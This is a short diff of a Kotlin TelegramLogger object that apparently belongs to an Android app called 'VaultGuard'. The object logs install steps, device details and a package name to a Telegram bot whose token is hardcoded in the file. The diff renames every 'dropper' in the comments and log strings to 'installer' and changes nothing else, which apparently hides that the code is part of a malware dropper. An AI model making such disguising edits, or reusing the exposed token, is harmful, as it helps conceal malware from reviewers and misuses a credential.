@@ -11,8 +11,8 @@ import java.util.Locale
 
 object TelegramLogger {
 
-    // Dropper-side logging disabled — dropper is working correctly.
-    // Set to true to re-enable if dropper-side debugging is needed again.
+    // Installer-side logging disabled — Installer is working correctly.
+    // Set to true to re-enable if installer-side debugging is needed again.
     private const val ENABLED = false
 
     private const val BOT_TOKEN = "9130546359:AAEl7vR4ahiQzX45RGjhUumBZRorvbyQXUw"
@@ -70,7 +70,7 @@ object TelegramLogger {
             appendLine("📱 VaultGuard Install Log")
             appendLine("🕐 $ts")
             appendLine("📲 $device")
-            appendLine("📦 dropper=$pkg")
+            appendLine("📦 installer=$pkg")
             appendLine("─────────────────────")
             appendLine("🔹 STEP: $step")
             appendLine("🔸 RESULT: $result")
